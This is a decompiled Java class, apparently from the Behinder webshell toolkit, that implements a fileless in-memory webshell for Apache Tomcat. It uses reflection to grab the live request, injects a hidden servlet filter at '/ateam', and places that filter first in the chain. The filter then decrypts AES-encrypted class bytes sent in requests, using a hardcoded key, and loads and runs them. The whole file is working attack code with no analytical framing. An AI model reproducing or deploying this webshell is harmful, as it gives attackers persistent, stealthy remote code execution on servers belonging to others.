package artsploit;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.FilterRegistration;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;
import org.apache.coyote.RequestInfo;

/* loaded from: behinder3.jar:artsploit/BehinderMemShell.class */
public class BehinderMemShell extends ClassLoader implements Filter {
    public String cs = "UTF-8";
    public String pwd = "02f2a5c80f47d495";
    public String path = "/ateam";
    public String filterName = "ateam666";
    public Request req = null;
    public Response resp = null;

    static {
        try {
            BehinderMemShell behinderMemShell = new BehinderMemShell();
            if (behinderMemShell.req != null && behinderMemShell.resp != null) {
                behinderMemShell.addFilter();
            }
        } catch (Exception e) {
        }
    }

    public Class g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new BigInteger(1, m.digest()).toString(16).substring(0, 16);
        } catch (Exception e) {
        }
        return ret;
    }

    public BehinderMemShell() {
        setParams();
    }

    public BehinderMemShell(ClassLoader c) {
        super(c);
        setParams();
    }

    public void setParams() {
        try {
            boolean flag = false;
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
            int i = 0;
            while (i < threads.length) {
                Thread thread = threads[i];
                if (thread != null) {
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("http")) {
                        Object target = getField(thread, "target");
                        Object global = null;
                        if (target instanceof Runnable) {
                            try {
                                global = getField(getField(getField(target, "this$0"), "handler"), "global");
                            } catch (NoSuchFieldException fieldException) {
                                fieldException.printStackTrace();
                            }
                        }
                        if (global != null) {
                            List processors = (List) getField(global, "processors");
                            i = 0;
                            while (true) {
                                if (i >= processors.size()) {
                                    break;
                                }
                                RequestInfo requestInfo = (RequestInfo) processors.get(i);
                                if (requestInfo == null) {
                                    i++;
                                } else {
                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) getField(requestInfo, "req");
                                    Request request = (Request) tempRequest.getNote(1);
                                    Response response = request.getResponse();
                                    this.req = request;
                                    this.resp = response;
                                    flag = true;
                                    break;
                                }
                            }
                        }
                    }
                }
                if (flag) {
                    break;
                }
                i++;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String addFilter() throws Exception {
        Class filterMap;
        ServletContext servletContext = this.req.getServletContext();
        String filterName = this.filterName;
        String url = this.path;
        if (servletContext.getFilterRegistration(filterName) == null) {
            StandardContext standardContext = null;
            Field stateField = null;
            try {
                try {
                    Field contextField = servletContext.getClass().getDeclaredField("context");
                    contextField.setAccessible(true);
                    ApplicationContext applicationContext = (ApplicationContext) contextField.get(servletContext);
                    Field contextField2 = applicationContext.getClass().getDeclaredField("context");
                    contextField2.setAccessible(true);
                    standardContext = (StandardContext) contextField2.get(applicationContext);
                    stateField = LifecycleBase.class.getDeclaredField("state");
                    stateField.setAccessible(true);
                    stateField.set(standardContext, LifecycleState.STARTING_PREP);
                    FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(filterName, this);
                    filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
                    Method filterStartMethod = StandardContext.class.getMethod("filterStart", new Class[0]);
                    filterStartMethod.setAccessible(true);
                    filterStartMethod.invoke(standardContext, null);
                    stateField.set(standardContext, LifecycleState.STARTED);
                    try {
                        filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                    } catch (Exception e) {
                        filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                    }
                    Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps", new Class[0]);
                    Object[] filterMaps = (Object[]) findFilterMaps.invoke(standardContext, new Object[0]);
                    for (int i = 0; i < filterMaps.length; i++) {
                        Object filterMapObj = filterMaps[i];
                        Method findFilterMaps2 = filterMap.getMethod("getFilterName", new Class[0]);
                        String name = (String) findFilterMaps2.invoke(filterMapObj, new Object[0]);
                        if (name.equalsIgnoreCase(filterName)) {
                            filterMaps[i] = filterMaps[0];
                            filterMaps[0] = filterMapObj;
                        }
                    }
                    stateField.set(standardContext, LifecycleState.STARTED);
                    return "Success";
                } catch (Exception var23) {
                    String var11 = var23.getMessage();
                    stateField.set(standardContext, LifecycleState.STARTED);
                    return var11;
                }
            } catch (Throwable th) {
                stateField.set(standardContext, LifecycleState.STARTED);
                throw th;
            }
        }
        return "Filter already exists";
    }

    public static Object getField(Object obj, String fieldName) throws Exception {
        Field f0 = null;
        Class cls = obj.getClass();
        while (true) {
            Class clas = cls;
            if (clas == Object.class) {
                break;
            }
            try {
                f0 = clas.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e) {
                cls = clas.getSuperclass();
            }
        }
        if (f0 != null) {
            f0.setAccessible(true);
            return f0.get(obj);
        }
        throw new NoSuchFieldException(fieldName);
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpSession session = this.req.getSession();
        Map obj = new HashMap();
        obj.put("request", this.req);
        obj.put("response", this.resp);
        obj.put("session", session);
        try {
            session.putValue("u", this.pwd);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(this.pwd.getBytes(), "AES"));
            new BehinderMemShell(getClass().getClassLoader()).g(c.doFinal(base64Decode(this.req.getReader().readLine()))).newInstance().equals(obj);
        } catch (Exception var7) {
            var7.printStackTrace();
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder", new Class[0]).invoke(null, new Object[0]);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }

    public void destroy() {
    }
}